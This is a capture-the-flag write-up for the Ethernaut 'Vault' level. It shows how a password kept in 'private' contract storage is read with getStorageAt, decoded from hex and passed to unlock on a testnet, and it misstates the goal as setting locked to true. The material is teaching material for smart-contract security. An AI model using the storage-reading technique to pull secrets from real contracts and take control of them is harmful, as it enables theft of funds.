# Level 8 - Vault

### Goal
The goal is to unlock the contract (i.e. locked = true).

### Approach
Values stored on the blockchain are publicly accesible. Even if we set them to private within the contract they can be found (private just means there is no automatic getter function for this variable). Understanding how storage work in Ethereum, we know that slot 0 is partially occupied with the bool value of locked (namely false, which is stored at 0 in Hex). The 2nd variable the contract stores is the password and it occupies 32 bytes (this takes up an entire slot). This the password will be allocated to slot 1 in a Hex format. We can get this data by calling the contract storage as such (I ran this in truffle console connected to the Ropsten network):
```
await web3.eth.getStorageAt(address, 1)
```
We can then convert this to ascii.
```
await web3.utils.hexToAscii('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
...
'A very strong secret password :)'
```
We can then send this as an argument to unlock the contract.
```
contract.unlock('A very strong secret password :)')
```
